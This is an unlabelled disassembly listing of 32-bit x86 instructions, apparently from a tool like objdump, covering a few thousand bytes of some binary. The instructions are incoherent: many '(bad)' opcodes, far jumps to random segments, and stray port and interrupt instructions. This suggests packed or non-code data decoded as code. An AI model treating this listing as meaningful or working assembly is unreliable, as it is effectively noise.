  41b8bc:	mov    dh,0xb5
  41b8be:	mov    ah,0x65
  41b8c0:	mov    cl,0x61
  41b8c2:	prefetch BYTE PTR [edi+0x29]
  41b8c6:	xor    DWORD PTR [esi+0x699e22d3],edi
  41b8cc:	test   eax,0xc73b0ddd
  41b8d1:	push   eax
  41b8d2:	sub    eax,0x57aa65de
  41b8d7:	pop    esi
  41b8d8:	mov    DWORD PTR [ebx+0xd],esi
  41b8db:	(bad)  
  41b8dc:	lahf   
  41b8dd:	cwde   
  41b8de:	(bad)  
  41b8df:	in     eax,0xf2
  41b8e1:	jns    0x41b916
  41b8e3:	cmp    ecx,edi
  41b8e5:	mov    eax,cs
  41b8e7:	push   eax
  41b8e8:	jecxz  0x41b8ca
  41b8ea:	fbstp  TBYTE PTR [edi+ecx*8]
  41b8ed:	dec    edi
  41b8ee:	xor    BYTE PTR [eax-0x66c89f16],cl
  41b8f4:	inc    edi
  41b8f5:	mov    ecx,0x4cd7755b
  41b8fa:	push   ecx
  41b8fb:	sbb    edi,ebx
  41b8fd:	inc    ebp
  41b8fe:	enter  0xa869,0xb
  41b902:	jmp    0x31739fed
  41b907:	push   ebx
  41b908:	ins    DWORD PTR es:[edi],dx
  41b909:	je     0x41b8ce
  41b90b:	pop    esi
  41b90c:	and    eax,0x32726006
  41b911:	pop    eax
  41b912:	les    ebx,FWORD PTR [edi]
  41b914:	loop   0x41b930
  41b916:	loopne 0x41b92f
  41b918:	push   ebx
  41b919:	popf   
  41b91a:	push   esi
  41b91b:	fldcw  WORD PTR [edi]
  41b91d:	xchg   edx,eax
  41b91e:	ss aas 
  41b920:	cdq    
  41b921:	ins    DWORD PTR es:[edi],dx
  41b922:	loopne 0x41b9a1
  41b924:	dec    ebx
  41b925:	xor    esp,DWORD PTR [ebx]
  41b927:	dec    edx
  41b928:	inc    edi
  41b929:	into   
  41b92a:	pop    edx
  41b92b:	mov    DWORD PTR [esi-0x33],esp
  41b92e:	test   eax,0x21f4bbc3
  41b933:	mov    esp,0xfa160de3
  41b938:	sbb    al,BYTE PTR [eax]
  41b93a:	lock je 0x41b95d
  41b93d:	push   0xeb9bdaa
  41b942:	sub    al,0x2d
  41b944:	xlat   BYTE PTR ds:[ebx]
  41b945:	dec    DWORD PTR [eax+edi*8+0xf80b775]
  41b94c:	dec    edi
  41b94d:	or     ebx,DWORD PTR [ebx-0x4aa7f653]
  41b953:	inc    edi
  41b954:	dec    DWORD PTR [ebp+0x22747d3b]
  41b95a:	lock sbb al,0x2f
  41b95d:	xchg   DWORD PTR ds:0xa78f89c6,ecx
  41b963:	sub    edx,DWORD PTR [esi+0x22a1cb68]
  41b969:	aas    
  41b96a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b96b:	pop    ds
  41b96c:	adc    eax,0x49874bf0
  41b971:	mov    ebx,0x9c85305
  41b976:	repz rol DWORD PTR [eax-0x6b],0x3f
  41b97b:	xchg   DWORD PTR [ecx+0x51ce973c],ebx
  41b981:	push   ebx
  41b982:	pop    ebp
  41b983:	mov    al,0xec
  41b985:	and    eax,0x4481c94d
  41b98a:	int3   
  41b98b:	daa    
  41b98c:	pop    esi
  41b98d:	(bad)  
  41b98e:	adc    dh,BYTE PTR [esi-0x180c94cb]
  41b994:	mov    ds:0x7071d000,eax
  41b999:	or     bh,BYTE PTR [ebx+0x4e]
  41b99c:	iret   
  41b99d:	loop   0x41b959
  41b99f:	cmp    cl,BYTE PTR gs:[edi+eax*8]
  41b9a3:	lock inc ebx
  41b9a5:	out    dx,al
  41b9a6:	daa    
  41b9a7:	add    al,BYTE PTR ds:0x615097bb
  41b9ad:	ja     0x41b9a5
  41b9af:	adc    al,0x49
  41b9b1:	popf   
  41b9b2:	(bad)  
  41b9b3:	shr    DWORD PTR [eax],1
  41b9b5:	add    BYTE PTR [edx],bl
  41b9b7:	cdq    
  41b9b8:	mov    ch,0xb1
  41b9ba:	fld    QWORD PTR [edx]
  41b9bc:	retf   0x8879
  41b9bf:	(bad)  
  41b9c1:	and    DWORD PTR [ebx-0x64ec1b63],ebp
  41b9c7:	adc    esp,ecx
  41b9c9:	inc    edi
  41b9ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9cb:	sbb    ecx,DWORD PTR [edx+0x6a]
  41b9ce:	or     BYTE PTR ds:[edx+edx*2],al
  41b9d2:	push   0x48
  41b9d4:	imul   edi,DWORD PTR [eax-0x433b07a2],0xb2158c37
  41b9de:	pusha  
  41b9df:	adc    eax,DWORD PTR [ebx-0x6d]
  41b9e2:	push   ebp
  41b9e3:	retf   
  41b9e4:	pop    ebp
  41b9e5:	sbb    cl,ah
  41b9e7:	mov    eax,ds:0x8059d97
  41b9ec:	loope  0x41ba39
  41b9ee:	test   DWORD PTR [edi-0x771347ca],eax
  41b9f4:	popa   
  41b9f5:	inc    esp
  41b9f6:	ds mov eax,0x632f1e74
  41b9fc:	dec    ebp
  41b9fd:	aas    
  41b9fe:	into   
  41b9ff:	mov    ecx,edx
  41ba01:	push   ebx
  41ba02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba03:	stc    
  41ba04:	push   es
  41ba05:	mov    ebx,0x6cbe8c0f
  41ba0a:	xor    ah,BYTE PTR [ebx+eiz*8+0x52]
  41ba0e:	dec    ebp
  41ba0f:	retf   
  41ba10:	jg     0x41ba8b
  41ba12:	sahf   
  41ba13:	sti    
  41ba14:	jl     0x41b9a3
  41ba16:	xor    cl,BYTE PTR [ecx+0xac068a]
  41ba1c:	sti    
  41ba1d:	xor    BYTE PTR [ebx+0x9],al
  41ba20:	adc    BYTE PTR ds:0x13583843,dh
  41ba26:	pop    edi
  41ba27:	dec    edx
  41ba28:	xchg   edx,eax
  41ba29:	xchg   esp,eax
  41ba2a:	aam    0x2
  41ba2c:	(bad)  
  41ba2d:	stos   BYTE PTR es:[edi],al
  41ba2e:	jne    0x41ba4f
  41ba30:	imul   BYTE PTR [edx+0x19437fe1]
  41ba36:	inc    ebx
  41ba37:	or     eax,0xa9653cd8
  41ba3c:	fwait
  41ba3d:	hlt    
  41ba3e:	call   0x7bb0:0x296b0489
  41ba45:	(bad)  
  41ba46:	pushf  
  41ba47:	fwait
  41ba48:	xchg   ecx,eax
  41ba49:	je     0x41baa8
  41ba4b:	mov    ebp,0x35118b7
  41ba50:	mov    al,0x9e
  41ba52:	xchg   BYTE PTR ds:0x33ff8f6f,bl
  41ba58:	lods   eax,DWORD PTR ds:[esi]
  41ba59:	ret    
  41ba5a:	jmp    FWORD PTR [eax+eiz*8-0x711b966f]
  41ba61:	xor    eax,0x69e31376
  41ba66:	jmp    0xf2fb:0xc0d2a1ab
  41ba6d:	jns    0x41ba79
  41ba6f:	jg     0x41ba72
  41ba71:	(bad)  
  41ba72:	(bad)  
  41ba73:	mov    esi,0x6a7b4497
  41ba78:	int    0x47
  41ba7a:	and    dh,ah
  41ba7c:	add    BYTE PTR [edi-0x6f],ch
  41ba7f:	jmp    0xb5f7:0xb4aac24f
  41ba86:	add    bh,BYTE PTR ds:0x2eea2b63
  41ba8c:	rcr    esp,cl
  41ba8e:	addr16 das 
  41ba90:	mov    ebx,0x53136881
  41ba95:	fstp   QWORD PTR ds:0x50a36472
  41ba9b:	or     DWORD PTR [edi],0xf4283d6a
  41baa1:	sub    BYTE PTR [edi+0x4a449ceb],ch
  41baa7:	fisub  DWORD PTR [edi]
  41baa9:	jg     0x41bae3
  41baab:	mov    WORD PTR [esi-0x46],cs
  41baae:	dec    edi
  41baaf:	sbb    BYTE PTR [bx+si-0x6c3c],0x91
  41bab5:	fcmovnb st,st(6)
  41bab7:	mov    ebx,0xc27b87af
  41babc:	addr16 out 0x4,al
  41babf:	sub    al,bh
  41bac1:	lock add ebp,esp
  41bac4:	fimul  DWORD PTR [edx+0x5105adfa]
  41baca:	stos   DWORD PTR es:[edi],eax
  41bacb:	loopne 0x41bafc
  41bacd:	imul   esi,ebp,0xffffffd9
  41bad0:	jecxz  0x41bad1
  41bad2:	sahf   
  41bad3:	xor    DWORD PTR [ecx+0x20],edi
  41bad6:	inc    esp
  41bad7:	stos   DWORD PTR es:[edi],eax
  41bad8:	outs   dx,BYTE PTR ds:[esi]
  41bad9:	push   esp
  41bada:	ret    0x1f92
  41badd:	or     eax,0x2361be31
  41bae2:	sub    dh,0x44
  41bae5:	add    BYTE PTR [ebx],cl
  41bae7:	mov    WORD PTR [edx-0x5c80c263],ds
  41baed:	icebp  
  41baee:	xchg   ebx,eax
  41baef:	push   ebx
  41baf0:	sbb    bl,BYTE PTR [ebp+0x3b]
  41baf3:	iret   
  41baf4:	sbb    DWORD PTR [ecx],esi
  41baf6:	loope  0x41bb31
  41baf8:	jmp    0x3f00:0x43ad73b3
  41baff:	ss inc eax
  41bb01:	imul   esi,DWORD PTR ds:0x82fc8ad9,0x69f966f
  41bb0b:	aas    
  41bb0c:	jecxz  0x41bac0
  41bb0e:	jb     0x41bad9
  41bb10:	xchg   ebp,eax
  41bb11:	outs   dx,DWORD PTR ds:[esi]
  41bb12:	fisttp DWORD PTR [edx]
  41bb14:	cmp    ecx,DWORD PTR [esi+0x6621dd02]
  41bb1a:	pusha  
  41bb1b:	push   esp
  41bb1c:	enter  0x72a3,0xba
  41bb20:	sbb    al,0xcc
  41bb22:	mov    gs:0xa2b5cab6,eax
  41bb28:	or     al,0x37
  41bb2a:	test   DWORD PTR [ebx+ecx*4+0x37546206],edi
  41bb31:	outs   dx,DWORD PTR ds:[esi]
  41bb32:	sbb    eax,0x7eb40fe3
  41bb37:	jp     0x41bb57
  41bb39:	inc    esi
  41bb3a:	mov    ds:0xbaf2ace2,al
  41bb3f:	xchg   edi,eax
  41bb40:	cli    
  41bb41:	mov    ebp,0x1c31f92
  41bb46:	push   eax
  41bb47:	rol    ah,1
  41bb49:	ins    BYTE PTR es:[edi],dx
  41bb4a:	pop    ebp
  41bb4b:	sub    edx,DWORD PTR ds:0x58690ea9
  41bb51:	in     al,0x42
  41bb53:	jno    0x41bbbd
  41bb55:	test   DWORD PTR [eax-0x72],esp
  41bb58:	push   cs
  41bb59:	fnstenv [ebx+0x51ffdec5]
  41bb5f:	cmp    esi,DWORD PTR [esp+esi*1-0x4b1975cd]
  41bb66:	ins    BYTE PTR es:[edi],dx
  41bb67:	(bad)
  41bb6a:	aad    0xbc
  41bb6c:	in     al,dx
  41bb6d:	sar    BYTE PTR [eax+ebp*2],1
  41bb70:	cmp    al,0x21
  41bb72:	jecxz  0x41bb8f
  41bb74:	xchg   ecx,eax
  41bb75:	mov    DWORD PTR [ecx],ecx
  41bb77:	lods   al,BYTE PTR ds:[esi]
  41bb78:	aas    
  41bb79:	push   edx
  41bb7a:	repz fld TBYTE PTR ds:0xdf6c83b1
  41bb81:	retf   0x6eb9
  41bb84:	jbe    0x41bbea
  41bb86:	dec    ecx
  41bb87:	or     edi,DWORD PTR [esp+ebp*2]
  41bb8a:	push   0x4d723d67
  41bb8f:	sub    eax,0x514b7f9
  41bb94:	push   edi
  41bb95:	mov    esp,0xb721c873
  41bb9a:	nop
  41bb9b:	clc    
  41bb9c:	lea    edi,es:[ecx]
  41bb9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bba0:	aam    0x66
  41bba2:	scas   eax,DWORD PTR es:[edi]
  41bba3:	stc    
  41bba4:	and    DWORD PTR [esi+0x7db7324f],ecx
  41bbaa:	adc    cl,BYTE PTR [esi-0x55403aa4]
  41bbb0:	in     eax,0xc1
  41bbb2:	jmp    0xa176:0x7e7c2699
  41bbb9:	jb     0x41bb93
  41bbbb:	mov    BYTE PTR [esi+0x6],dl
  41bbbe:	ins    BYTE PTR es:[edi],dx
  41bbbf:	sbb    al,0x2a
  41bbc1:	or     al,0x99
  41bbc3:	in     al,dx
  41bbc4:	push   edx
  41bbc5:	push   cs
  41bbc6:	sbb    cl,BYTE PTR [esi-0x1b]
  41bbc9:	es (bad) 
  41bbcc:	fld    DWORD PTR [ecx]
  41bbce:	ror    DWORD PTR [edx],0x94
  41bbd1:	lea    ecx,ds:0xef293d03
  41bbd7:	mov    ah,0x33
  41bbd9:	imul   esi,ecx,0x23b0cab9
  41bbdf:	jle    0x41bbee
  41bbe1:	dec    ebx
  41bbe2:	je     0x41bb8a
  41bbe4:	cmp    DWORD PTR [ebp-0x23],0xffffff98
  41bbe8:	push   0xffffffa1
  41bbea:	add    BYTE PTR [edx],ah
  41bbec:	mov    ecx,0x329e4b45
  41bbf1:	imul   edx,DWORD PTR [ebp-0x3faf70da],0x11
  41bbf8:	xchg   esi,eax
  41bbf9:	mov    eax,0x93e12a5d
  41bbfe:	push   0xf267c9d4
  41bc03:	(bad)  
  41bc04:	(bad)  
  41bc05:	xchg   ebp,eax
  41bc06:	call   0xfe4e:0x30924cab
  41bc0d:	xor    ebp,DWORD PTR [esi]
  41bc0f:	pop    ebx
  41bc10:	int    0x68
  41bc12:	xchg   ecx,eax
  41bc13:	push   ss
  41bc14:	jg     0x41bc34
  41bc16:	sbb    BYTE PTR [ebx-0x5177f8b2],bh
  41bc1c:	cld    
  41bc1d:	or     BYTE PTR ds:0x74bd9dce,ch
  41bc23:	in     eax,0xe
  41bc25:	out    0x30,eax
  41bc27:	sbb    al,0x12
  41bc29:	cli    
  41bc2a:	test   eax,0x55fbae12
  41bc2f:	fsubr  DWORD PTR [ecx+0x33f8a1f2]
  41bc35:	dec    ebx
  41bc36:	ret    
  41bc37:	mov    al,0xc7
  41bc39:	cmp    BYTE PTR [edx-0x63700bbf],dl
  41bc3f:	jne    0x41bbd1
  41bc41:	cmp    esp,ecx
  41bc43:	sub    eax,DWORD PTR [edx+0x35]
  41bc46:	scas   eax,DWORD PTR es:[edi]
  41bc47:	and    esp,ecx
  41bc49:	mov    eax,0xf2caa83f
  41bc4e:	push   esp
  41bc4f:	adc    DWORD PTR ds:0x1dcd4e91,ebx
  41bc55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc56:	jge    0x41bc05
  41bc58:	call   FWORD PTR [esi]
  41bc5a:	xchg   esp,eax
  41bc5b:	jmp    0xa44fa364
  41bc60:	test   DWORD PTR [ebx+0x67037762],0x83943284
  41bc6a:	stos   DWORD PTR es:[edi],eax
  41bc6b:	mov    dl,0xe6
  41bc6d:	pop    ss
  41bc6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc6f:	ffreep st(1)
  41bc71:	data16 stos BYTE PTR es:[edi],al
  41bc73:	pop    esp
  41bc74:	add    al,0xf0
  41bc76:	ja     0x41bc43
  41bc78:	push   ecx
  41bc79:	ins    DWORD PTR es:[edi],dx
  41bc7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc7b:	fs ja  0x41bc2e
  41bc7e:	cmp    al,BYTE PTR [eax]
  41bc80:	push   ebx
  41bc81:	sar    BYTE PTR [edx],0xb6
  41bc84:	and    eax,0x5197d1d7
  41bc89:	push   ebp
  41bc8a:	sbb    DWORD PTR [esp+esi*1+0x70],esp
  41bc8e:	inc    eax
  41bc8f:	pop    ds
  41bc90:	fdivr  QWORD PTR [ebp+0x1a6f3e99]
  41bc96:	and    esi,ebx
  41bc98:	jmp    0x41bc39
  41bc9a:	or     DWORD PTR ds:0x4ece754d,edi
  41bca0:	dec    dx
  41bca2:	push   0xaf7c7f58
  41bca7:	pop    ds
  41bca8:	push   ds
  41bca9:	adc    al,0x89
  41bcab:	xlat   BYTE PTR ds:[ebx]
  41bcac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bcad:	and    ecx,edi
  41bcaf:	xchg   ebx,eax
  41bcb0:	out    0x88,eax
  41bcb2:	mov    ch,ah
  41bcb4:	xchg   edi,eax
  41bcb5:	sub    al,0x14
  41bcb7:	jmp    0x96302625
  41bcbc:	das    
  41bcbd:	sub    eax,edx
  41bcbf:	lea    ebx,[eax+0x22d8ec28]
  41bcc5:	pop    eax
  41bcc6:	pop    edi
  41bcc7:	add    al,0x3a
  41bcc9:	das    
  41bcca:	add    ecx,DWORD PTR [ecx]
  41bccc:	mov    bl,0x69
  41bcce:	push   eax
  41bccf:	out    0x3d,eax
  41bcd1:	jno    0x41bd0f
  41bcd3:	int3   
  41bcd4:	jmp    0xceaf:0xf71927fb
  41bcdb:	test   al,0xa8
  41bcdd:	jge    0x41bc7f
  41bcdf:	mov    ecx,0x283a3fa6
  41bce4:	fiadd  DWORD PTR ds:0x4873d0bf
  41bcea:	inc    edi
  41bceb:	push   ebp
  41bcec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bced:	dec    ebp
  41bcee:	imul   dl
  41bcf0:	es push esi
  41bcf2:	cs (bad) 
  41bcf5:	or     BYTE PTR [ebx+edi*4+0x7ccea4ce],bl
  41bcfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bcfd:	add    esi,esi
  41bcff:	imul   esi,DWORD PTR [edi+0x7e],0xf569ca2b
  41bd06:	sti    
  41bd07:	mov    esp,0xb7cb0a4
  41bd0c:	adc    esi,esp
  41bd0e:	std    
  41bd0f:	jae    0x41bd4a
  41bd11:	xor    BYTE PTR [edx],ch
  41bd13:	dec    edi
  41bd14:	mov    cl,0x15
  41bd16:	mov    esi,0x2b825de9
  41bd1b:	push   ecx
  41bd1c:	jmp    0x4fe8:0x902b7300
  41bd23:	jmp    0xfdeed302
  41bd28:	jmp    0x41bd03
  41bd2a:	mov    esp,0xa469dd23
  41bd2f:	jo     0x41bd75
  41bd31:	jmp    0x506c:0x1fd931c3
  41bd38:	xlat   BYTE PTR ds:[ebx]
  41bd39:	pop    ecx
  41bd3a:	dec    esi
  41bd3b:	mov    ah,0x7c
  41bd3d:	int3   
  41bd3e:	jmp    0xc37d:0x924319c9
  41bd45:	sbb    ebx,DWORD PTR [eax]
  41bd47:	mov    ebp,0xff0b235b
  41bd4c:	and    al,0x92
  41bd4e:	fbstp  TBYTE PTR [esi+0x28]
  41bd51:	ret    0xa213
  41bd54:	xor    eax,0x66baccf9
  41bd59:	(bad)  
  41bd5a:	out    dx,al
  41bd5b:	rcl    DWORD PTR [edi-0x4f],cl
  41bd5e:	mov    dl,0xdf
  41bd60:	adc    bh,bl
  41bd62:	dec    eax
  41bd63:	rcr    DWORD PTR [edx+0x669a1279],1
  41bd69:	and    esi,esi
  41bd6b:	add    eax,ebx
  41bd6d:	outs   dx,BYTE PTR ds:[esi]
  41bd6e:	fimul  WORD PTR [ebx+0xb]
  41bd71:	popf   
  41bd72:	hlt    
  41bd73:	das    
  41bd74:	ss (bad) 
  41bd76:	call   0x96e8:0x2c483a13
  41bd7d:	ins    BYTE PTR es:[edi],dx
  41bd7e:	lods   eax,DWORD PTR ds:[esi]
  41bd7f:	loope  0x41bd57
  41bd81:	lods   eax,DWORD PTR ds:[esi]
  41bd82:	mov    BYTE PTR [ebx],dh
  41bd84:	sub    al,BYTE PTR [edi-0x19]
  41bd87:	xchg   ebp,eax
  41bd88:	adc    ebp,DWORD PTR [eax]
  41bd8a:	mov    esp,0x9f7e9b60
  41bd8f:	sub    ah,BYTE PTR [ecx]
  41bd91:	jmp    0x41be06
  41bd93:	ror    DWORD PTR [eax],cl
  41bd95:	loopne 0x41bd6f
  41bd97:	or     ax,0x9af
  41bd9b:	js     0x41bd4e
  41bd9d:	xor    DWORD PTR [esi+0x1c],ebp
  41bda0:	cvttps2pi mm1,QWORD PTR [edx]
  41bda3:	jecxz  0x41bd2b
  41bda5:	repz xchg edx,eax
  41bda7:	inc    edx
  41bda8:	jae    0x41be02
  41bdaa:	mov    ds:0x98d828e9,al
  41bdaf:	pop    eax
  41bdb0:	sub    edx,edx
  41bdb2:	pop    ebx
  41bdb3:	fdiv   QWORD PTR ds:[eax+0x697a8c1a]
  41bdba:	out    dx,al
  41bdbb:	fs sti 
  41bdbd:	xchg   esp,eax
  41bdbe:	aaa    
  41bdbf:	sbb    BYTE PTR [eax+0x50],al
  41bdc2:	adc    ebx,DWORD PTR [ebx-0xc023652]
  41bdc8:	xor    DWORD PTR [ecx],esp
  41bdca:	adc    ah,BYTE PTR [esi+0x31824adf]
  41bdd0:	int    0x94
  41bdd2:	imul   edx,DWORD PTR [eax+0x20],0xffffff9a
  41bdd6:	pop    esi
  41bdd7:	loop   0x41bdd6
  41bdd9:	pushf  
  41bdda:	fdivr  DWORD PTR [edi*2+0x69a1297f]
  41bde1:	ror    BYTE PTR [eax+0x72],cl
  41bde4:	jne    0x41bdf2
  41bde6:	pop    esi
  41bde7:	scas   eax,DWORD PTR es:[edi]
  41bde8:	mov    ds:0x3e55e67b,eax
  41bded:	pop    edi
  41bdee:	retf   
  41bdef:	sbb    al,0x13
  41bdf1:	fnstenv [esi+0x27adeed3]
  41bdf7:	dec    esp
  41bdf8:	or     cl,BYTE PTR gs:[edi+0x3]
  41bdfc:	mov    ebp,0xbd4e0f58
  41be01:	adc    eax,0x72c15e0b
  41be06:	pusha  
  41be07:	jge    0x41bdca
  41be09:	xchg   DWORD PTR [esi],esi
  41be0b:	fidivr WORD PTR [eax]
  41be0d:	aam    0x7c
  41be0f:	mov    ebx,0x942e13af
  41be14:	pop    ebp
  41be15:	sub    DWORD PTR [esi],ebp
  41be17:	(bad)  
  41be18:	jmp    0xf34b0042
  41be1d:	int    0x11
  41be1f:	sbb    eax,0x18734007
  41be24:	fs (bad) 
  41be26:	xlat   BYTE PTR ds:[ebx]
  41be27:	xchg   DWORD PTR [ecx-0x66],edi
  41be2a:	jmp    0x41bdce
  41be2c:	add    BYTE PTR [si],bh
  41be2f:	das    
  41be30:	cld    
  41be31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be32:	push   0x3f
  41be34:	repz jecxz 0x41be58
  41be37:	and    al,0xc9
  41be39:	and    bl,BYTE PTR [eax-0x60ab51f0]
  41be3f:	push   DWORD PTR [eax]
  41be41:	mov    WORD PTR [eax+0x48c86781],cs
  41be47:	push   ss
  41be48:	sub    eax,0x67653c9e
  41be4d:	add    dh,BYTE PTR [eax]
  41be4f:	js     0x41beb3
  41be51:	test   DWORD PTR [ebx-0x3e08d874],ebx
  41be57:	mov    edx,0x6a6893c5
  41be5c:	add    dh,BYTE PTR [ebp+0x65a51e39]
  41be62:	fwait
  41be63:	push   esp
  41be64:	inc    edi
  41be65:	push   eax
  41be66:	xchg   esp,eax
  41be67:	xchg   edx,eax
  41be68:	mov    BYTE PTR [edi+0x0],bl
  41be6b:	scas   al,BYTE PTR es:[edi]
  41be6c:	sbb    eax,0x60bdadcc
  41be71:	or     al,0xcb
  41be73:	popf   
  41be74:	jae    0x41be0f
  41be76:	je     0x77ab3b55
  41be7c:	test   dh,bh
  41be7e:	cmp    BYTE PTR [esi+eiz*2+0x6d],0x6e
  41be83:	fadd   st,st(6)
  41be85:	pop    ecx
  41be86:	fs fcmovb st,st(5)
  41be89:	mov    ecx,esi
  41be8b:	push   ds
  41be8c:	enter  0x58a,0x72
  41be90:	in     al,0x3b
  41be92:	dec    ecx
  41be93:	xchg   ebp,eax
  41be94:	push   eax
  41be95:	addr16 popa 
  41be97:	mul    DWORD PTR [eax+esi*8-0x775e34e2]
  41be9e:	add    al,0xf3
  41bea0:	adc    dl,dh
  41bea2:	loope  0x41be6f
  41bea4:	inc    ecx
  41bea5:	icebp  
  41bea6:	inc    edi
  41bea7:	add    esi,0xffffffc8
  41beaa:	imul   esp,DWORD PTR [edi+0x4440ab23],0xd8e38e8b
  41beb4:	sbb    edi,DWORD PTR [ebp-0x15]
  41beb7:	lods   al,BYTE PTR ds:[esi]
  41beb8:	push   cs
  41beb9:	adc    ebp,0x15
  41bebc:	ins    BYTE PTR es:[edi],dx
  41bebd:	sbb    al,0xaa
  41bebf:	sbb    DWORD PTR [esi+0x3a869b67],ebp
  41bec5:	dec    ecx
  41bec6:	aad    0x19
  41bec8:	bnd ja 0x41bf2b
  41becb:	xchg   ebx,eax
  41becc:	sbb    bl,BYTE PTR [edx]
  41bece:	popa   
  41becf:	mov    BYTE PTR [ecx+ebx*1-0x5769f654],cl
  41bed6:	loope  0x41bf13
  41bed8:	je     0x41bebd
  41beda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bedb:	xchg   edx,eax
  41bedc:	into   
  41bedd:	xchg   esi,eax
  41bede:	scas   eax,DWORD PTR es:[edi]
  41bedf:	or     DWORD PTR [edi-0x42],edx
  41bee2:	push   cs
  41bee3:	inc    esp
  41bee4:	push   ebp
  41bee5:	inc    ebp
  41bee6:	jl     0x41befe
  41bee8:	das    
  41bee9:	mov    ds:0xda649bbd,al
  41beee:	push   ds
  41beef:	xchg   DWORD PTR [edi+0x62],edx
  41bef2:	push   eax
  41bef3:	scas   al,BYTE PTR es:[edi]
  41bef4:	inc    ebx
  41bef5:	inc    esp
  41bef6:	fs add al,0x78
  41bef9:	call   0xf02a7f87
  41befe:	outs   dx,BYTE PTR ds:[esi]
  41beff:	add    al,0x66
  41bf01:	adc    al,0x12
  41bf03:	lds    ecx,FWORD PTR ds:0x7006627f
  41bf09:	fchs   
  41bf0b:	xor    al,0x14
  41bf0d:	mov    dh,0x6d
  41bf0f:	or     ch,BYTE PTR [esi]
  41bf11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf12:	sub    esp,DWORD PTR [edi+0x1e2cd38c]
  41bf18:	shl    esi,cl
  41bf1a:	or     DWORD PTR [edx],edi
  41bf1c:	xor    DWORD PTR [ebx-0x7d],eax
  41bf1f:	or     DWORD PTR [edx+0x2a8e1fc9],ebp
  41bf25:	mov    esi,0x28c2c0ca
  41bf2a:	cmc    
  41bf2b:	push   ds
  41bf2c:	push   cs
  41bf2d:	cdq    
  41bf2e:	sbb    esp,esi
  41bf30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf31:	in     eax,0xe3
  41bf33:	pop    edi
  41bf34:	jb     0x41bebe
  41bf36:	(bad)  
  41bf37:	shl    DWORD PTR [edi-0x7615e82b],0x9f
  41bf3e:	in     al,dx
  41bf3f:	fdivr  QWORD PTR [edx+0x8]
  41bf42:	add    cl,BYTE PTR [ebp+0x73]
  41bf45:	and    al,0xc3
  41bf47:	loope  0x41bfb1
  41bf49:	cli    
  41bf4a:	fstp   TBYTE PTR [eax+esi*2]
  41bf4d:	mov    al,ds:0xb61bab35
  41bf52:	mov    esi,0xc27ba81f
  41bf57:	mov    dh,0xb
  41bf59:	fwait
  41bf5a:	or     DWORD PTR [esi-0x73],0x80dc24b3
  41bf61:	jmp    0xaae6:0xa589982b
  41bf68:	sbb    al,0x4
  41bf6a:	gs gs sahf 
  41bf6d:	in     eax,dx
  41bf6e:	ins    DWORD PTR es:[edi],dx
  41bf6f:	xor    al,0x3b
  41bf71:	out    dx,al
  41bf72:	test   eax,0xd3d09ec9
  41bf77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf78:	push   cs
  41bf79:	jl     0x41bfa2
  41bf7b:	cmp    dh,BYTE PTR [esi+0x33]
  41bf7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf7f:	xchg   DWORD PTR [eax-0xc],esp
  41bf82:	ficomp WORD PTR [edi+0x58d1e7f1]
  41bf88:	and    cl,dh
  41bf8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf8b:	je     0x41bff5
  41bf8d:	clc    
  41bf8e:	daa    
  41bf8f:	stc    
  41bf90:	jo     0x41bf6d
  41bf92:	mov    bh,0x37
  41bf94:	shl    BYTE PTR [edx+0x21],0x94
  41bf98:	inc    DWORD PTR [eax+0x1c]
  41bf9b:	test   DWORD PTR [esi],edi
  41bf9d:	fadd   DWORD PTR [esi-0x7963813f]
  41bfa3:	stos   BYTE PTR es:[edi],al
  41bfa4:	mov    esp,ds
  41bfa6:	inc    edx
  41bfa7:	jg     0x41c022
  41bfa9:	sahf   
  41bfaa:	jle    0x41bfd0
  41bfac:	loop   0x41bf53
  41bfae:	mov    dh,0x66
  41bfb0:	mov    ds:0x3491543b,al
  41bfb5:	ins    BYTE PTR es:[edi],dx
  41bfb6:	aam    0xab
  41bfb8:	and    ebx,ebp
  41bfba:	ss sbb eax,0x1306d36f
  41bfc0:	into   
  41bfc1:	or     eax,esi
  41bfc3:	(bad)  
  41bfc4:	mov    dl,0xe0
  41bfc6:	(bad)  
  41bfc7:	cli    
  41bfc8:	mov    cl,0xfa
  41bfca:	xchg   edx,eax
  41bfcb:	test   eax,0x8550f1
  41bfd0:	xchg   ebp,eax
  41bfd1:	fistp  QWORD PTR [esi+edx*8-0xf924d55]
  41bfd8:	and    esp,eax
  41bfda:	inc    ecx
  41bfdb:	adc    eax,0xc6c4d7c4
  41bfe0:	mov    ebp,0x16d010ee
  41bfe5:	and    edx,ebp
  41bfe7:	mov    ah,0xc9
  41bfe9:	pop    ecx
  41bfea:	adc    DWORD PTR [edi+0x71],edi
  41bfed:	xchg   ebp,eax
  41bfee:	fisubr DWORD PTR [esi+ebp*8-0x49181554]
  41bff5:	rcr    DWORD PTR [ecx],0xd1
  41bff8:	icebp  
  41bff9:	or     ecx,DWORD PTR [eax]
  41bffb:	popf   
  41bffc:	xor    esi,DWORD PTR [edx-0x65784ce1]
  41c002:	push   ss
  41c003:	and    BYTE PTR [ebp-0x6535be7a],ch
  41c009:	pop    esi
  41c00a:	ror    BYTE PTR [ebx+ebp*1],0x51
  41c00e:	call   0x6578:0x9ebde879
  41c015:	jo     0x41bff3
  41c017:	(bad)
  41c01a:	(bad)  
  41c01b:	fild   WORD PTR [esi+0x2d]
  41c01e:	add    al,0xb
  41c020:	sub    eax,0xdaaf9481
  41c025:	mov    ecx,0x124ccf21
  41c02a:	xor    al,0x3a
  41c02c:	jecxz  0x41c072
